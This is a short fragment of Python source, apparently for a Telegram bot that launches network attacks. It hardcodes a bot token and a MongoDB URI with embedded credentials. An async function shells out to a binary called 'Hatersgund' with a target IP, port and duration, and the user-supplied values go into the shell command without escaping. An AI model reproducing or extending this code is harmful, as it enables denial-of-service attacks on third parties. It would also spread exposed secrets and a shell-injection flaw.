...
TOKEN = '7560718607:AAHAw0DYFp5zNVPnRF03EoiPTEXybHQcMu0'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002432899737
CHANNEL_ID = -1002432899737
error_channel_id = -1002432899737
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./Hatersgund {target_ip} {target_port} {duration} 900")
